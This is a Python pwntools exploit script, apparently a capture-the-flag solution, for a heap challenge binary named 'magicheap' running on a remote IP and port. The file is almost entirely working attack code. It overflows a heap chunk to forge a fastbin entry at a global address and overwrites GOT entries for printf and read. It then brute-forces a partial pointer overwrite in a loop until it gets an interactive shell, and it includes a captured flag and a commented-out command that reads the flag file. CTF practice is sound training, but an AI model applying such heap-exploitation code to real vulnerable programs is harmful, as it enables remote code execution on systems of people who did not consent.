#!/usr/bin/env python
from pwn import *

# FLAG{h34p_0verfl0w_is_e4ay_for_u}

context.arch = 'amd64'
e , l = ELF( './magicheap' ) , ELF( './libc.so.6-14c22be9aa11316f89909e4237314e009da38883' )

host , port = '35.201.132.60' , 50216
#y = remote( host , port )
#y = process( './magicheap' )
#y = process( './magicheap' , env = { 'LD_PRELOAD' : './libc.so.6-14c22be9aa11316f89909e4237314e009da38883' } )

def cre( size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def edt( idx , size , data ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def dle( idx ):
    y.sendafter( 'ice :' , '3' )
    y.sendafter( ':' , str( idx ) )


while True:

    y = remote( host , port )

    y.sendafter( ':' , p64( 0x0 ) + p64( 0x71 ) )


    cre( 0x68 , 'yuawn' )
    cre( 0x68 , 'yuawn' )
    cre( 0x700 , 'yuawn' )

    dle( 1 )

    edt( 0 , 0x700 , 'Y' * 0x68 + p64( 0x71 ) + p64( 0x6020a0 ) )

    cre( 0x68 , 'yuawn' )

    p = flat(
    	0,
    	0x6020c0,
    	e.got['printf'],
    	e.got['read']
    )

    cre( 0x68 , p )

    edt( 1 , 0x2 , '\x17\x71' )

    try:
        sleep( 1 )
        y.interactive()
        y.close()
    except:
        y.close()
        continue
        
    #sleep( 1.6 )

    #y.sendline( 'cat /home/`whoami`/flag' )


    #y.interactive()